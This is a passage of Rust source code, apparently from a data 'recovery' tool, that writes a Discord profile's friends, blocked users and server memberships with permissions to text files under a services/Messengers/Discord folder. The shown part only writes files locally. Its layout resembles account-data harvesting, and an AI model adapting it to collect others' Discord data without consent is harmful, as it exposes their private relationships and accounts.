                owned_builder.push('\n');

                for guild in &profile.other_servers {
                    other_builder.push_str(&format!(
                        "Name: {} ({})\nPermissions: {}\nDiscoverable: {}\nCustom Link: {}\n\n",
                        guild.name,
                        guild.id,
                        guild.permissions.as_deref().unwrap_or_default(),
                        guild.discoverable,
                        guild.vanity_url,
                    ));
                }
                other_builder.push('\n');
            }
        }

        let mut relations_combined = String::new();
        relations_combined.push_str(&friends_builder);
        relations_combined.push_str(&blocked_builder);

        let mut servers_combined = String::new();
        servers_combined.push_str(&owned_builder);
        servers_combined.push_str(&other_builder);

        let mut artifacts = Vec::new();
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Basic.txt", &user_builder).await?,
        );
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Relations.txt", &relations_combined)
                .await?,
        );
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Servers.txt", &servers_combined)
                .await?,
        );

        Ok(artifacts)
    }
}

async fn write_discord_text_artifact(
    ctx: &RecoveryContext,
    label: &str,
    file_name: &str,
    contents: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Messengers")
        .join("Discord");
    fs::create_dir_all(&folder).await?;

    let target = folder.join(file_name);
    fs::write(&target, contents).await?;
    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}
